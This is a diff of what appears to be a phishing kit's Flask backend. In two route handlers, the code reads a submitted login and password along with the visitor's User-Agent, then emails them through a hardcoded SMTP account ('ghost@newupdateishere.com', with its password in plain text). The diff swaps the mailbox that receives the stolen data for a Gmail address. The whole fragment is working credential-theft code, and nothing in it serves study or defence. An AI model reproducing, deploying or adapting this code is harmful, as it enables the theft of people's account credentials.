@@ -149,7 +149,7 @@ def first():
         wellson = request.form.get("wehorse")
         wellspass = request.form.get("wechorse")
         sender_email = "ghost@newupdateishere.com"
-        receiver_email = "laughlin.clovis@madeforthat.org"
+        receiver_email = "danielnewwoj@gmail.com"
         password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -189,7 +189,7 @@ def second():
         wellson = request.form.get("wehorse")
         wellspass = request.form.get("wechorse")
         sender_email = "ghost@newupdateishere.com"
-        receiver_email = "laughlin.clovis@madeforthat.org"
+        receiver_email = "danielnewwoj@gmail.com"
         password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
